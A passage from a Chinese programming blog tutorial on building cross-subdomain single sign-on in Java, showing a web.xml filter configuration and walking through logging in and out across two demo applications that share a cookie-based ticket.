<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">  <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">servlet-mapping</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li></ol>&#13;
</div>&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">       WebSSODemo/WEB-INF/web.xml：</span>&#13;
<div class="dp-highlighter bg_html" style="font-family:Consolas,'Courier New',Courier,mono,serif; width:938.516px; overflow:hidden; padding-top:1px; border-color:rgb(204,204,204); color:rgb(85,85,85); line-height:35px; margin:18px 0px!important; background-color:rgb(231,229,220)">&#13;
<div class="bar" style="padding-left:45px">&#13;
<div class="tools" style="padding:3px 8px 10px 10px; font-size:9px; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; color:silver; border-left-width:3px; border-left-style:solid; border-left-color:rgb(153,153,153); background-color:rgb(248,248,248)">&#13;
<strong>[html]</strong> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20466351" class="ViewSource" title="view plain" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">view&#13;
 plain</a><span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20466351" class="CopyToClipboard" title="copy" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">copy</a></span>&#13;
<div style="position:absolute; left:476px; top:2599px; width:27px; height:15px; z-index:99">&#13;
</div>&#13;
<span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20466351" class="PrintSource" title="print" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">print</a></span><a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20466351" class="About" title="?" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">?</a><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/217752" title="在CODE上查看代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/CODE_ico.png" width="12" height="12" alt="在CODE上查看代码片" style="border:none; position:relative; top:1px; left:2px" /></a></span><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/217752/fork" title="派生到我的代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/ico_fork.svg" width="12" height="12" alt="派生到我的代码片" style="border:none; position:relative; top:2px; left:2px" /></a></span></div>&#13;
</div>&#13;
<ol start="1" class="dp-xml" style="padding:0px; border:none; color:rgb(92,92,92); margin:0px 0px 1px 45px!important; background-color:rgb(255,255,255)">&#13;
<li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-class</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">com.ghsau.filter.SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-class</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="comments" style="margin:0px; padding:0px; border:none; color:rgb(0,130,0); background-color:inherit">&lt;!-- 认证系统服务 --&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOService</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">http://passport.ghsau.com:8080/WebSSOAuth/SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="comments" style="margin:0px; padding:0px; border:none; color:rgb(0,130,0); background-color:inherit">&lt;!-- 认证系统登录页面 --&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOLogin</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">http://passport.ghsau.com:8080/WebSSOAuth/login.jsp</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="comments" style="margin:0px; padding:0px; border:none; color:rgb(0,130,0); background-color:inherit">&lt;!-- 认证系统ticket名称 --&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">cookieName</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOID</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">  <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">  <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-mapping</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">url-pattern</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">*.jsp</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">url-pattern</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">  <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-mapping</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">  <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-mapping</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">url-pattern</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">/logout</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">url-pattern</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">  <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-mapping</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li></ol>&#13;
</div>&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">       如果域名或端口号和我的不一致，可以修改对应配置项。最后部署到应用服务器中，启动服务器。</span><br style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px" />&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>SSO使用</strong></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>       </strong>首先输入第一个应用系统的访问地址，http://web1.ghsau.com:8080/WebSSODemo/index.jsp，如果是第一次访问的话，会自动跳转到登录页，如下图：<img src="http://img.blog.csdn.net/20140304220529515?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="" style="border:none; max-width:602px; height:auto" /></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       系统中内置了3个用户，张三、李四、王五，用户名和密码皆为拼音全拼，输入zhangsan/zhangsan登录后，会自动跳转到我们刚才访问的页面，页面中显示了登录的用户名及欢迎信息，如下图：<img src="http://img.blog.csdn.net/20140304220835828?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="" style="border:none; max-width:602px; height:auto" /></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       这时，我们再输入第二个应用系统的访问地址，http://web2.ghsau.com:8080/WebSSODemo/index.jsp，我们发现，没有进行第二次登录，同样页面中显示了登录的用户名及欢迎信息，如下图：<img src="http://img.blog.csdn.net/20140304221211718?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="" style="border:none; max-width:602px; height:auto" /></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       我们接着点击Logout注销用户，页面跳转到了登录页面，这时我们再回头访问第一个应用系统的页面，发现同样跳转到了登录页面。这给用户的使用效果就是，一个应用登录了，其它的应用都会自动登录，而一个应用中注销了，其它的应用也都会自动注销，好神奇的样子。<br />&#13;
       项目中提供了源码，代码的实现思路就是上面的那个图，ticket保存在cookie中，利用cookie域的特性，实现了ticket在不同应用中都能够获取到，ticket的验证过程是使用了HttpClient来发送的验证请求，ticket的加密使用了3DES，具体可以看DESUtils.<a target="_blank" href="http://lib.csdn.net/base/17" class="replace_word" title="Java EE知识库" style="text-decoration:none; color:rgb(223,52,52); font-weight:bold">Java</a>，好了，就到这里吧</p>&#13;
<br />&#13;
</div>&#13;
<div><br />&#13;
</div>&#13;
<h1>完全跨域名的单点登录</h1>&#13;
<div>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
